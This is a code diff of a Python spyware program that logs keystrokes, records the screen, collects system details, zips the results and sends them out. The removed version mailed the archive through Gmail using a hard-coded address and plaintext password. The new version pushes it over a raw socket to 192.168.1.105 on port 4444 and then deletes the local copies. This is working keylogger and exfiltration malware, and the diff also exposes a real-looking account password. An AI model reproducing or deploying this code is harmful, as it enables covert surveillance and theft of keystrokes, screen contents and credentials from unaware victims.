@@ -1,18 +1,20 @@
+ser_add = "192.168.1.105"
+ser_port = 4444
+
+            #modules needed
 import os
 import platform as plat
+from tkinter.ttk import Separator
 from pynput import keyboard
 import numpy as np
 import cv2
-import pyautogui 
+import pyautogui
 import threading
 import shutil
-import smtplib
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
+import socket
+import tqdm
 
-
+            #functions
 def keyboard_monitoring():
     #collect events (pressed keys)
     with keyboard.Listener(on_press=savekey) as listener:
@@ -36,59 +38,49 @@ def record():
             out.write(frame)
         cv2.destroyAllWindows()
         out.release()
-        shutil.make_archive("C:/Docs/Docs_z", 'zip', "C:/Docs")
+        shutil.make_archive("D:/Docs_z", 'zip', "C:/Docs")
         keys_file = open("C:/Docs/keys.txt", "w").close()
         os.remove("C:/Docs/vid.avi")
-        send_mail()
-        os.remove("C:/Docs/Docs_z.zip")
+        send_Docs()
+        os.remove("D:/Docs_z.zip")
 
 def savekey(key):
     keys_file = open("C:/Docs/keys.txt", "a")
     keys_file.write(str(key)+"\n")
     keys_file.close()
 
-def send_mail():
-    msg = MIMEMultipart()
-    msg['From'] = from_add
-    msg['To'] = to_add
-    msg['Subject'] = "New monitoring files to see"
-    body = "check that"
-    msg.attach(MIMEText(body, 'plain'))
-    filename = "Docs_z.zip"
-    attachment = open("C:/Docs/Docs_z.zip", "rb")
-    p = MIMEBase('application', 'octet-stream')
-    p.set_payload((attachment).read())
-    encoders.encode_base64(p)
-    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
-    msg.attach(p) 
-    try: 
-        s = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-        s.login(from_add, password)
-        text = msg.as_string()
-        s.sendmail(from_add, to_add, text)
-        s.quit()
-    except:
-        print("lost")
-    attachment.close()
-from_add = "otmanmabrouk2020@gmail.com"
-password = "otmanmabrouk-1999"
-to_add = "otmanelmabrouk99@gmail.com"
-        #1-Docs & info-gath
+def send_Docs():
+    filename = "D:/Docs_z.zip"
+    filesize = os.path.getsize(filename)
+    buffer_size = 4096
+    my_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    my_sock.connect((ser_add, ser_port))     
+    progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
+    with open(filename, "rb") as f:
+        while True:
+            # read the bytes from the file
+            bytes_read = f.read(buffer_size)
+            if not bytes_read:
+                # file transmitting is done
+                break
+            my_sock.sendall(bytes_read)
+            progress.update(len(bytes_read))
+    my_sock.close()
+
+            #1-Docs & info-gath
 #check if Docs exist if it doesn't creates it
 Docs_exist = os.path.isdir("C:/Docs")
 if Docs_exist == False:
     os.mkdir("C:/Docs")
-
 #clear the content of keys.txt or create it if it doesn't exist 
 keys_file = open("C:/Docs/keys.txt", "w").close()
-
 #gather infos about the machine and append them to keys.txt
 os_info = "OS name: "+str(plat.system())+"   OS version: "+str(plat.release())+"  architecture: "+str(plat.architecture())
 keys_file = open("C:/Docs/keys.txt", "a")
 keys_file.write(os_info+"\n\n")
 keys_file.close()
 
-        #2-start monitoring
+            #2-start monitoring
 thread1 = threading.Thread(target=keyboard_monitoring)
 thread2 = threading.Thread(target=record)
 thread1.start()
